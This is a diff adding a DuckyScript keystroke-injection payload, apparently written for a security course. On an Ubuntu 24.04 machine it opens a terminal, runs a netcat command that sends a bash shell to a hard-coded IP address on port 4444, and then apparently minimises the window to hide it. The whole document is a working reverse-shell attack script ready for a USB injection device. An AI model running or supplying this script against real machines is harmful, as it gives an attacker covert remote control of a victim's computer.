@@ -1,0 +1,26 @@
+REM_BLOCK
+    Name: Ubuntu 24.04 Reverse Shell
+    DuckyScript: Ubuntu 24.04 Reverse shell via NC with Variables and Error Handling
+    Author: Alex Kagansky
+    Course: CYBR 4950
+END_REM
+
+REM --- Variables ---
+STRING IP_ADDR = "100.64.177.3"
+ENTER
+STRING PORT = "4444"
+ENTER
+
+REM --- Script ---
+DELAY 2000
+CTRL ALT t
+DELAY 1000
+
+STRING if command -v nc >/dev/null 2>&1; then nc $IP_ADDR $PORT -e /bin/bash; else echo "Netcat not found"; fi
+ENTER
+
+DELAY 500
+
+ALT SPACE
+DOWN
+ENTER
